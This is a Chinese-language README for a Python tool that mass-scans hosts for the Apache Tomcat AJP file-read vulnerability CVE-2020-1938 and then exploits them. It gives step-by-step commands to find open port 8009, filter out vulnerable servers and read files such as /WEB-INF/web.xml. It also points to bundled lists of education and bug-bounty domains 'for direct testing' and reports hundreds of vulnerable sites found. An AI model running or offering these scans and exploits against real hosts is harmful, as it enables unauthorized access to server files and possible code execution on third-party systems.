# CNVD-2020-10487 (CVE-2020-1938) 漏洞扫描工具

**注：仅供学习，严禁非法使用**

基于 Python 2.x，可以批量扫描 Apache Tomcat AJP 协议文件读取漏洞（Python 3.x 简单修改可用）

具体可查看：[CNVD 公开信息](https://www.cnvd.org.cn/flaw/show/CNVD-2020-10487)

漏洞影响版本：

- Apache Tomcat 7 < 7.0.100

- Apache Tomcat 8 < 8.5.51

- Apache Tomcat 9 < 9.0.31

此漏洞为 LFI (Local File Inclusion)，但有可能构造为 RCE (Remote Code Execution)

PoC 来源并修改于 [CNVD-2020-10487-Tomcat-Ajp-lfi-Scanner](https://github.com/Kit4y/CNVD-2020-10487-Tomcat-Ajp-lfi-Scanner) 与 [CNVD-2020-10487-Tomcat-Ajp-lfi](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi)

## 操作

### 将需要扫描的 IP 或域名放于 `ip.txt`

`ip.txt` 中不需要加协议，比如：

```
127.0.0.1
www.baidu.com
www.google.com
```

src 域名收集文件夹中为本人收集的教育src和补天src的一些域名，可直接测试

### 批量扫描 `8009` AJP 端口开放情况

```bash
python threading-find-port-8009.py
```

这将会生成 `8009.txt`，作用为扫描 `ip.txt` 中 IP 或域名，并找出开放的 `8009` 端口

### 筛选可利用漏洞的 Tomcat Server

```bash
python threading-CNVD-2020-10487-Tomcat-Ajp-lfi.py
```

从 `8009.txt` 中筛选出符合漏洞的 IP 或域名，放置于 `vul.txt` 中，最后 `vul.txt` 中存在的域名即为含有漏洞的 IP 或域名

测试可知，补天公益 SRC 有 100+ 站点，教育 SRC 大概 300 站点包含此漏洞

![漏洞扫描](1.png)

### 漏洞利用测试

```bash
python CNVD-2020-10487-Tomcat-Ajp-lfi.py 127.0.0.1
```

两个脚本的最后一行均为线程数，默认是 `20`，可自行修改，分别位于：

- `threading-find-port-8009.py` 的 67 行

- `threading-CNVD-2020-10487-Tomcat-Ajp-lfi.py` 的 341 行

```python
thread_num = 20
```

### 其他

漏洞测试利用更推荐使用 [AJPy](https://github.com/hypn0s/AJPy) 工具包，如需利用 `CVE-2020-1938`：

```bash
python tomcat.py read_file --webapp=ROOT /WEB-INF/web.xml 127.0.0.1
```
